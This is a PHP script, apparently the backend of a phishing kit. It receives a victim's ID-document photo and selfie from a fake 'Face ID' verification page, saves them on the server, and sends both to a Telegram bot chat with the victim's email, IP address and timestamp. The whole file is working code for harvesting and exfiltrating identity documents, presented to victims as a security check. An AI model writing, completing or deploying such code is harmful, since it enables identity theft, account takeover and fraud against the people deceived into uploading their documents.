<?php
// process_faceid.php
// Script para recibir, guardar y enviar las imágenes de Face ID a Telegram.

session_start();

// 1. Cargar la configuración de Telegram
// Asegúrate de que 'conexion.php' esté en el mismo directorio o ajusta la ruta.
$config = require 'conexion.php'; 

if (!isset($config['telegram']['bot_token']) || !isset($config['telegram']['chat_id'])) {
    error_log("Error: Credenciales de Telegram no configuradas.");
    header('Location: segurity_faceid.php?error=config_fail');
    exit;
}

$botToken = $config['telegram']['bot_token'];
$chatId = $config['telegram']['chat_id'];


$id_data = $_POST['id_data'] ?? null;
$selfie_data = $_POST['selfie_data'] ?? null;
$user_email = $_SESSION['logged_in_email'] ?? 'desconocido_'.time(); 


if ($id_data && $selfie_data) {
    
    // --- FUNCIÓN PARA PROCESAR Y GUARDAR IMAGEN BASE64 ---
    function saveBase64Image($base64_string, $output_file) {
        // La data Base64 viene con el prefijo "data:image/jpeg;base64,"
        $data = explode(',', $base64_string);
        if (count($data) < 2) return false;
        
        $image_binary = base64_decode($data[1]);
        if ($image_binary === false) return false;

        return file_put_contents($output_file, $image_binary);
    }
    // --------------------------------------------------------
    
    // --- FUNCIÓN PARA ENVIAR IMAGEN A TELEGRAM ---
    function sendPhotoToTelegram($botToken, $chatId, $photoPath, $caption) {
        $url = "https://api.telegram.org/bot{$botToken}/sendPhoto";
        
        $post_fields = array(
            'chat_id' => $chatId,
            'caption' => $caption,
            'photo'   => new CURLFile($photoPath) // Usar CURLFile para subir archivos
        );

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 15);
        $response = curl_exec($ch);
        curl_close($ch);
        
        return $response;
    }
    // --------------------------------------------------------

    // Definir la carpeta de subida y nombre de archivos
    $safe_email = preg_replace('/[^a-zA-Z0-9_\-.]/', '', $user_email);
    $dir = 'uploads/faceid/' . $safe_email . '/';
    if (!is_dir($dir)) {
        mkdir($dir, 0777, true);
    }
    
    $timestamp = time();
    $id_filename = $dir . 'id_' . $timestamp . '.jpg';
    $selfie_filename = $dir . 'selfie_' . $timestamp . '.jpg';

    // 2. Guardar los archivos en el servidor
    $id_saved = saveBase64Image($id_data, $id_filename);
    $selfie_saved = saveBase64Image($selfie_data, $selfie_filename);

    if ($id_saved && $selfie_saved) {
        
        $caption_base = "👤 *Usuario:* " . htmlspecialchars($user_email) . "\n🌐 *IP:* " . ($_SERVER['REMOTE_ADDR'] ?? 'Desconocida') . "\n⏰ *Hora:* " . date('Y-m-d H:i:s');
        
        // 3. Enviar la foto del ID a Telegram
        $caption_id = "🚨 *CAPTURA DE ID (DOCUMENTO)* 🚨\n" . $caption_base;
        sendPhotoToTelegram($botToken, $chatId, $id_filename, $caption_id);
        
        // 4. Enviar la foto Selfie a Telegram
        $caption_selfie = "🤳 *CAPTURA DE SELFIE* 🤳\n" . $caption_base;
        sendPhotoToTelegram($botToken, $chatId, $selfie_filename, $caption_selfie);
        
        // 5. Redirigir al siguiente paso
        header('Location: verification_success.php');
        exit;
    } else {
        error_log("FaceID Error: Fallo al guardar las imágenes en el disco para: " . $user_email);
        header('Location: segurity_faceid.php?error=save_failed');
        exit;
    }

} else {
    // Datos faltantes
    header('Location: segurity_faceid.php?error=data_missing');
    exit;
}